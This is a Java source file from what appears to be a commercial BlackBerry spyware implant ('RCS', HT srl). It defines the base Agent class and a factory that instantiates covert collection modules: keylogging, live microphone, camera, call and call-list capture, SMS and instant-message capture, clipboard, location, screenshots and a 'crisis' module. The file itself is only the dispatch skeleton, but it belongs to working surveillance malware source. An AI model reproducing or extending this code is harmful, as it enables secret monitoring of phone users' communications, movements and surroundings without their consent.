//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Agent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.log.Log;
import blackberry.log.LogCollector;
import blackberry.threadpool.TimerJob;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class Agent.
 */
public abstract class Agent extends TimerJob {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
    //#endif

    public static final int AGENT = 0x1000;
    public static final int AGENT_INFO = AGENT;
    public static final int AGENT_MESSAGE = AGENT + 0x1;
    public static final int AGENT_TASK = AGENT + 0x2;
    public static final int AGENT_CALLLIST = AGENT + 0x3;
    public static final int AGENT_DEVICE = AGENT + 0x4;
    public static final int AGENT_POSITION = AGENT + 0x5;
    public static final int AGENT_CALL = AGENT + 0x6;
    public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
    public static final int AGENT_KEYLOG = AGENT + 0x8;
    public static final int AGENT_SNAPSHOT = AGENT + 0x9;
    public static final int AGENT_URL = AGENT + 0xa;
    public static final int AGENT_IM = AGENT + 0xb; //4107
    // public static final int AGENT_EMAIL = AGENT + 0xc;
    public static final int AGENT_MIC = AGENT + 0xd;
    public static final int AGENT_CAM = AGENT + 0xe;
    public static final int AGENT_CLIPBOARD = AGENT + 0xf;
    public static final int AGENT_CRISIS = AGENT + 0x10;
    public static final int AGENT_APPLICATION = AGENT + 0x11;
    public static final int AGENT_LIVE_MIC = AGENT + 0x12;
    public static final int AGENT_PDA = 0xDF7A;

    /**
     * Factory.
     * 
     * @param agentId
     *            the agent id
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     * @return the agent
     */
    public static Agent factory(final int agentId, final boolean agentStatus,
            final byte[] confParams) {

        //#ifdef DBC
        Check.requires(confParams != null, "factory: confParams != null");
        //#endif

        switch (agentId) {
        case AGENT_MESSAGE:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_MESSAGE");
            //#endif
            return new MessageAgent(agentStatus, confParams);
        case AGENT_TASK:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_TASK");
            //#endif
            return new TaskAgent(agentStatus, confParams);
        case AGENT_CALLLIST:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CALLLIST");
            //#endif
            return new CallListAgent(agentStatus, confParams);
        case AGENT_DEVICE:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_DEVICE");
            //#endif
            return new DeviceInfoAgent(agentStatus, confParams);
        case AGENT_POSITION:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_POSITION");
            //#endif
            return new PositionAgent(agentStatus, confParams);
        case AGENT_CALL:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CALL");
            //#endif
            return new CallAgent(agentStatus, confParams);
        case AGENT_CALL_LOCAL:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CALL_LOCAL");
            //#endif
            return new CallLocalAgent(agentStatus, confParams);
        case AGENT_KEYLOG:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_KEYLOG");
            //#endif
            return new KeyLogAgent(agentStatus, confParams);
        case AGENT_SNAPSHOT:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_SNAPSHOT");
            //#endif
            return new SnapShotAgent(agentStatus, confParams);
        case AGENT_URL:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_URL");
            //#endif
            return new UrlAgent(agentStatus, confParams);
        case AGENT_IM:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_IM");
            //#endif
            return new ImAgent(agentStatus, confParams);
        case AGENT_MIC:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_MIC");
            //#endif
            return new MicAgent(agentStatus, confParams);
        case AGENT_CAM:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CAM");
            //#endif
            return new CamAgent(agentStatus, confParams);
        case AGENT_CLIPBOARD:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CLIPBOARD");
            //#endif
            return new ClipBoardAgent(agentStatus, confParams);
        case AGENT_CRISIS:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_CRISIS");
            //#endif
            return new CrisisAgent(agentStatus, confParams);
        case AGENT_APPLICATION:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_APPLICATION");
            //#endif
            return new ApplicationAgent(agentStatus, confParams);
        case AGENT_PDA:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_PDA");
            //#endif
            return new PdaAgent(agentStatus, confParams);
        case AGENT_LIVE_MIC:
            //#ifdef DEBUG_TRACE
            debug.trace("Factory AGENT_LIVE_MIC");
            //#endif
            return new LiveMicAgent(agentStatus, confParams);
        default:
            //#ifdef DEBUG_TRACE
            debug.trace("AgentId UNKNOWN: " + agentId);
            //#endif
            return null;
        }
    }

    Status status;

    LogCollector logCollector;

    boolean logOnSD;
    public int agentId;

    // public int agentStatus;

    // public int command;

    protected Log log;

    /**
     * Instantiates a new agent.
     * 
     * @param agentId_
     *            the agent id_
     * @param agentEnabled
     *            the agent enabled
     * @param logOnSD_
     *            the log on s d_
     * @param name
     *            the name
     */
    protected Agent(final int agentId_, final boolean agentEnabled,
            final boolean logOnSD_, final String name) {
        super(name);
        status = Status.getInstance();
        logCollector = LogCollector.getInstance();

        agentId = agentId_;

        logOnSD = logOnSD_;
        log = logCollector.factory(this, logOnSD_);

        enable(agentEnabled);
    }

    public void init(final boolean agentEnabled, final byte[] confParams){
        parse(confParams);
        enable(agentEnabled);
    }
    
    /**
     * On sd.
     * 
     * @return true, if successful
     */
    public final boolean onSD() {
        return logOnSD;
    }

    /**
     * Parses the.
     * 
     * @param confParameters
     *            the conf parameters
     * @return true, if successful
     */
    protected abstract boolean parse(byte[] confParameters);

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#toString()
     */
    public final String toString() {
        return "Agent " + name + "|" + agentId;

    }

}
